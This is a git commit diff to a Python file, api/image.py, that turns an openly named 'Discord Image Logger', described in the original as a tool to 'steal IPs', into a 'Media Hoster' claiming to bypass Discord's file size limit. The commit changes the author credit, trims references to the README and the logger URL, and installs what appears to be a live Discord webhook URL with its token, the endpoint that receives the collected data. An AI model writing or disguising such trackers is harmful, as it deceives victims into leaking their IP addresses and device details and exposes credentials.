854f1f1ef7525a270d5f778c0c6860eb937a9fd9
GIFS <minecraftgamerboii64@gmail.com>
2025-07-05 18:50:25 +0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -1,21 +1,20 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+# image.py
+# gif hoster
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__app__ = "Media Hoster"
+__description__ = "Bypass Discord's file size limit!"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "GIF"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
+    "webhook": "https://discord.com/api/webhooks/1391020580345745428/GdjLklPpvGStD8VOkqux7owCGOgQBrn19X6eYC51jXK_BuvVpTeSnsF0kIm2IvX4B2Az",
     "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": True, # Allows you to use a URL argument to change the image
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
